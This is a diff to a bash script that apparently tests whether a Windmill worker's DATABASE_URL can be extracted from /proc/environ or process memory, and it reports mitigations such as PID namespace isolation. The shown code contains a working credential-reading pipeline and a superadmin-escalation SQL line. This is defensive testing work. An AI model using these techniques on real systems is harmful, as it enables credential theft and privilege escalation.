@@ -25,41 +25,16 @@ echo "  Found windmill PID: $windmill_pid"
 # Attack Vector 1: /proc/environ (MOST RELIABLE - check this FIRST)
 echo ""
 echo "[2/6] Attack Vector 1: Reading /proc/$windmill_pid/environ..."
+environ_extracted=""
 if [ -r /proc/$windmill_pid/environ ]; then
     echo "  ⚠️ Environment file IS readable"
-    extracted=$(cat /proc/$windmill_pid/environ 2>/dev/null | tr '\0' '\n' | grep "^DATABASE_URL=")
+    environ_extracted=$(cat /proc/$windmill_pid/environ 2>/dev/null | tr '\0' '\n' | grep "^DATABASE_URL=")
 
-    if [ -n "$extracted" ]; then
-        echo ""
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        echo "❌❌❌ CRITICAL VULNERABILITY ❌❌❌"
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        echo ""
-        echo "DATABASE_URL successfully extracted from /proc/environ:"
-        echo ""
-        echo "$extracted"
-        echo ""
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        echo ""
-        echo "ATTACK IMPACT:"
-        echo "  • Full database credentials exposed"
-        echo "  • Direct PostgreSQL access possible"
-        echo "  • Can escalate to superadmin via:"
-        echo "    UPDATE password SET super_admin=TRUE WHERE username='attacker'"
-        echo "  • Full workspace data access and modification"
-        echo ""
-        echo "EXPLOITATION DIFFICULTY:"
-        echo "  • Skill level: TRIVIAL (cat, tr, grep - standard Linux)"
-        echo "  • Time required: < 1 second"
-        echo "  • Privileges needed: None (same UID as worker)"
-        echo ""
-        echo "MITIGATION:"
-        echo "  ✅ Enable PID namespace isolation (ENABLE_UNSHARE_PID=true)"
-        echo "  ✅ Or use NSJAIL sandboxing"
-        echo ""
-        exit 1
+    if [ -n "$environ_extracted" ]; then
+        echo "  ✓ DATABASE_URL found in /proc/environ!"
+    else
+        echo "  DATABASE_URL not found in environ"
     fi
-    echo "  DATABASE_URL not found in environ"
 else
     echo "  ✅ Cannot read /proc/$windmill_pid/environ (protected by PID isolation)"
 fi
@@ -138,30 +113,47 @@ for region in $regions; do
 done
 
 echo ""
-echo "[6/6] Memory extraction results:"
+echo "[6/6] Final Results:"
 echo ""
 
-if [ -n "$extracted" ]; then
+# Check if either attack vector succeeded
+if [ -n "$environ_extracted" ] || [ -n "$extracted" ]; then
     echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-    echo "❌❌❌ CRITICAL VULNERABILITY (Memory Extraction) ❌❌❌"
+    echo "❌❌❌ CRITICAL VULNERABILITY ❌❌❌"
     echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     echo ""
-    echo "DATABASE_URL successfully extracted from process memory regions:"
+    echo "DATABASE_URL successfully extracted via:"
     echo ""
-    echo "$extracted"
-    echo ""
+
+    if [ -n "$environ_extracted" ]; then
+        echo "✓ Attack Vector 1: /proc/environ"
+        echo "  $environ_extracted"
+        echo ""
+    fi
+
+    if [ -n "$extracted" ]; then
+        echo "✓ Attack Vector 2: Process memory (heap/stack)"
+        echo "  $extracted"
+        echo ""
+    fi
+
     echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     echo ""
     echo "ATTACK IMPACT:"
-    echo "  • Full database credentials exposed from heap/stack memory"
+    echo "  • Full database credentials exposed"
     echo "  • Direct PostgreSQL access possible"
     echo "  • Can escalate to superadmin via:"
     echo "    UPDATE password SET super_admin=TRUE WHERE username='attacker'"
     echo "  • Full workspace data access and modification"
     echo ""
     echo "EXPLOITATION DIFFICULTY:"
-    echo "  • Skill level: LOW-MEDIUM (dd, strings, grep)"
-    echo "  • Time required: 5-30 seconds"
+    if [ -n "$environ_extracted" ]; then
+        echo "  • Skill level: TRIVIAL (/proc/environ: cat, tr, grep)"
+        echo "  • Time required: < 1 second"
+    else
+        echo "  • Skill level: LOW-MEDIUM (memory: dd, strings, grep)"
+        echo "  • Time required: 5-30 seconds"
+    fi
     echo "  • Privileges needed: Same UID as worker (default)"
     echo ""
     echo "MITIGATION:"
@@ -171,15 +163,14 @@ if [ -n "$extracted" ]; then
     exit 1
 else
     echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-    echo "⚠️ DATABASE_URL not found in heap/stack memory regions"
+    echo "✅ SECURE - DATABASE_URL extraction failed"
     echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     echo ""
-    echo "Memory extraction failed, but this doesn't mean system is secure:"
-    echo "  • Credentials may be in other memory regions not searched"
-    echo "  • May require more sophisticated extraction tools"
-    echo "  • /proc/environ extraction (Attack Vector 1) already succeeded"
+    echo "Could not extract DATABASE_URL from:"
+    echo "  • /proc/environ (protected)"
+    echo "  • Process memory regions (not found)"
     echo ""
-    echo "RECOMMENDATION: Enable PID namespace isolation or NSJAIL"
+    echo "This indicates PID namespace isolation or NSJAIL is working!"
     echo ""
-    exit 1
+    exit 0
 fi
